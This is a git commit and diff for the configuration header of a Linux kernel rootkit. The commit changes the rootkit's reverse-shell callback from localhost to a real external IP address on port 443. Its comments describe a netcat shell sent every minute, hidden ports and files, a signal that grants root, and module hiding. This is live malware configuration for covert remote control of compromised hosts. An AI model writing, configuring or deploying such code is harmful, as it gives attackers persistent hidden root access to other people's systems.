866004f9cb06b0bf8c3c365edf85938ab455b1d8
cyberbullet <yellphonenaing@gmail.com>
2025-07-02 23:17:26 +0630

    Update reverse shell server configuration
    - Changed server IP to 109.120.179.45
    - Changed server port to 443
    - Rebuilt module with new configuration

--- config.h
+++ config.h
@@ -32,8 +32,8 @@ MODULE_DESCRIPTION("Ring 0 Rootkit for Linux Kernels x86/x86_64 5.x/6.x");
 #define HIDE_PORT 1234              // TCP and UDP port to hide (only netstat & lsof)
 #define MAGIC_PREFIX "reb_"         // folder/file prefix to hide
 //==========[REVERSE SHELL]=========//
-#define YOUR_SRV_IP "127.0.0.1"     // IP address of your server to receive the shell via netcat (executes every 1 minute)
-#define YOUR_SRV_PORT 1234          // port where you will receive the shell
+#define YOUR_SRV_IP "109.120.179.45"     // IP address of your server to receive the shell via netcat (executes every 1 minute)
+#define YOUR_SRV_PORT 443          // port where you will receive the shell
 //==================================//
 #define SIGUSR1 10                  // user2root signal
 #define SIGUSR2 12                  // hide/show module signal
